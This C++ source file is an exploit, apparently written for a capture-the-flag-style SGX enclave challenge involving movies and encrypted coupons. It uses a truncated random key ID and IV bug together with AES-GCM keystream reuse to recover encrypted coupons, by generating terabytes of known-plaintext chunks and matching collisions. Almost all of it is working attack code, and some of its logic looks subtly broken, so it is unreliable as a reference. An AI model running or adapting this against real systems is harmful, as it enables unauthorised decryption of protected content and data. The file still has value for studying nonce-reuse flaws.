
#include "stdafx.h"
#include "exploits.h"
#include "common_enclave_actions.h"
#include <map>
/*
small note on exploited bug: 
	*(reinterpret_cast<uint8_t*>(&data[i])) = xorshift128plus();
                        ^
						this should be uint64_t, not uint8_t

						This converts key id of 32 bytes to be 4 bytes of random data
						and 12 bytes of IV to be 2 bytes of random data.
						This actually means that we have a good chances to recover the movie 
						after some sequential downloads of it and much better chances to reveal
						the coupons which are stored encrypted in library folder.
Small note on AES GCM:

AES GCM is a very simple thing:

cypher_text[i] = aes_ecb_encrypt(IV = iv[0..11]+dword(i / 16), KEY=key, plaintext = zeros[0..15]) ^ plain_text[ i & 0xf];
Just simple as that.
This actually means that it uses zeros encrypted with the key, 12 bytes of pre-generated iv and a block counter as a rest of the iv.
If we have known plaintext for specific key and iv we can reveal the intermediate encripted zeros, which
will allow us to decrypt anything encrypted with the same set opf parameters.

*/
// create an enclave
// tweak the ocalls to redirect all the output to the same file 
//	do
//   write log 0s of 1024 byte length (movie chunk size)
//  while we still have place on one of disks
//  (In my setup I have ~6TB of external disks)
// while not decrypted 
// 	create some coupon files and read them into the memory 
//  (stored in std::map with a key generated from random bytes)
//  while reading pre-generated files by chunks
//		create a map key from the chunk
//      search for it in the std::map
//      if found
//			get corresponding encrtypted coupon file
//			xor the read chunk payload with zeros
//			xor the coupons with the result
//			coupons out, return

void xor_data(unsigned char* a, unsigned char *b, unsigned char *res, size_t len)
{
	for (size_t i = 0; i < len; i++) res[i] = a[i] ^ b[i];

}


void e5_crypto_extraction(char* server_ip, int iport, char* library_folder)
{
	if (!load_enclave())
	{
		printf("\n can not load enclave");
		return;
	}
	size_t * ids = nullptr;
	bool *is_payed = nullptr;
	uint64_t i;
	unsigned int num_of_movies = 0;
	if (!init_enclave(server_ip, library_folder, iport))
	{
		printf("\nCan not initialize enclave for getting EPG...");
		return;
	}
	if (!get_epg_info(&ids, &is_payed, &num_of_movies))
	{
		printf("\nCan not get EPG info. Is your server running ?");
		return;
	}
#ifdef DO_DATA_GENERATION
	unsigned char data[1024];
	memset(data, 0, 1024);
	set_print_mode(false);
	set_write_mode(true); // writing to memory to avoid multiple file openings 
	for (i = 0; i < (uint64_t)3* 1024 * 1024*1024; i++)
	{
		char name[1024];
		sprintf(name, "e:\\%zx.dat", i);
		substitute_format(true, (unsigned char*)"wb");
		substitute_file_name(true,(unsigned char*) name);
		write_app_log(data, 1024);
		close_last_opened_file();
		if (i % (32*1024) == 0)
		{
			time_t t = time(0);   // get time now
			struct tm * now = localtime(&t);
			printf("\n generated %zx %d:%d:%d", i, now->tm_hour, now->tm_min, now->tm_sec);
		}
		
	}
	unload_enclave();
	set_write_mode(false);
	substitute_format(false, (unsigned char*)"wb");
	substitute_file_name(false, (unsigned char*)"");

	exit(1);
#endif
	i = 0;
	unload_enclave();
	
	
	char *data_files[] =
	{
	    "D:\\memstorage0.dat",
		"E:\\memstorage0.dat",
		""
	};
	char * index_file = "C:\\Users\\atlas\\Documents\\memstorage1.idx";

	#define SGX_AESGCM_MAC_SIZE             16

	#define SGX_SEAL_TAG_SIZE       SGX_AESGCM_MAC_SIZE
	#define SGX_SEAL_IV_SIZE        12

	typedef struct __data_portion
	{
		//independent_key_request_t  key_request;       /* 00: The key request used to obtain the sealing key */
		uint16_t                        key_name;        /* Identifies the key required */
		uint16_t                        key_policy;      /* Identifies which inputs should be used in the key derivation */
		sgx_isv_svn_t                   isv_svn;         /* Security Version of the Enclave */
		uint16_t                        reserved1;       /* Must be 0 */
		sgx_cpu_svn_t                   cpu_svn;         /* Security Version of the CPU */
		sgx_attributes_t                attribute_mask;  /* Mask which ATTRIBUTES Seal keys should be bound to */
		sgx_key_id_t                    key_id;          /* Value for key wear-out protection */
		sgx_misc_select_t               misc_mask;       /* Mask what MISCSELECT Seal keys bound to */

		uint32_t           plain_text_offset; /* 64: Offset within aes_data.playload to the start of the optional additional MAC text */
		uint8_t            reserved[12];      /* 68: Reserved bits */
	    //independent_aes_gcm_data_t aes_data;          /* 80: Data structure holding the AES/GCM related data */
		uint32_t  payload_size;                   /*  0: Size of the payload which includes both the encrypted data and the optional additional MAC text */
		uint32_t  correction;                   /*  0: Size of the payload which includes both the encrypted data and the optional additional MAC text */
		uint8_t   iv[SGX_SEAL_IV_SIZE];						  /*  4: was Reserved bits , became IV for the chunk */
		uint8_t   payload_tag[SGX_SEAL_TAG_SIZE]; /* 16: AES-GMAC of the plain text, payload, and the sizes */

		unsigned char encrypted_data[1024];
	}data_portion_t;

	data_portion_t data_portion;
	data_portion_t cpn_portion;

#define GENERATED_COUPONS 1024*512
	std::map<uint64_t, data_portion_t> coupon_variants;
	char cpn_file[1024];
	snprintf(cpn_file, 1024, "%s\\coupon.enc", library_folder);

	printf("\n Generated coupon variants ... \n");
	set_print_mode(false);

	for (i = 0; i < GENERATED_COUPONS; i++)
	{
		if (!load_enclave())
		{
			printf("\n can not load enclave");
			return;
		}
		if (!init_enclave(server_ip, library_folder, iport))
		{
			printf("\nCan not initialize enclave for getting EPG...");
			return;
		}
		unload_enclave();
		FILE* cpfile = fopen(cpn_file, "rb");
		if (!cpfile)
		{
			printf("\n can not open file %s (%zd) GetLastError = %d, exiting ...", cpn_file, i, GetLastError());
		}
		memset(&cpn_portion, 0, sizeof(cpn_portion));
		size_t read_len = fread(&cpn_portion, 1, sizeof(cpn_portion), cpfile);
		fclose(cpfile);
		unsigned char key[8] = { 0 };
		uint64_t *pkey = (uint64_t*)key;
		key[0] = cpn_portion.key_id.id[0];
		key[1] = cpn_portion.key_id.id[8];
		key[2] = cpn_portion.key_id.id[16];
		key[3] = cpn_portion.key_id.id[24];
		key[4] = cpn_portion.iv[0];
		key[5] = cpn_portion.iv[8];

		coupon_variants[*pkey] = cpn_portion;
		if (i % 1024 == 0) printf(".");
	}

	printf("\n Generating coupons done ...");

	unsigned char zeros[1024], thekey[1024], decrypted[1024];
	memset(zeros, 0, 1024);
	memset(decrypted, 0, 1024);
	memset(thekey, 0, 1024);
	memset(&cpn_portion, 0, sizeof(cpn_portion));
	while (strlen(data_files[i]) != 0)
	{
		unsigned char key[8];
		uint64_t *pkey = (uint64_t*)key;
		FILE * reader = fopen(data_files[i], "rb");
		uint64_t file_offset = 0;
		while (fread(&data_portion, 1, sizeof(data_portion_t), reader) == sizeof(data_portion_t))
		{
			memset(key, 0, 8);
			key[0] = data_portion.key_id.id[0];
			key[1] = data_portion.key_id.id[8];
			key[2] = data_portion.key_id.id[16];
			key[3] = data_portion.key_id.id[24];
			key[4] = data_portion.iv[0];
			key[5] = data_portion.iv[8];

			if (coupon_variants.find(*pkey) != coupon_variants.end())
			{
				auto it = coupon_variants.find(*pkey);
				data_portion = (*it).second;
				printf("\n FOUND by offset %zx at file %s", file_offset, data_files[i]);
				xor_data(data_portion.encrypted_data, zeros, thekey, 1024);
				xor_data(cpn_portion.encrypted_data, thekey, decrypted, 1024);
				printf("\n%s\n", decrypted);

			}
			file_offset += sizeof(data_portion_t);
		}
		fclose(reader);
	}
}
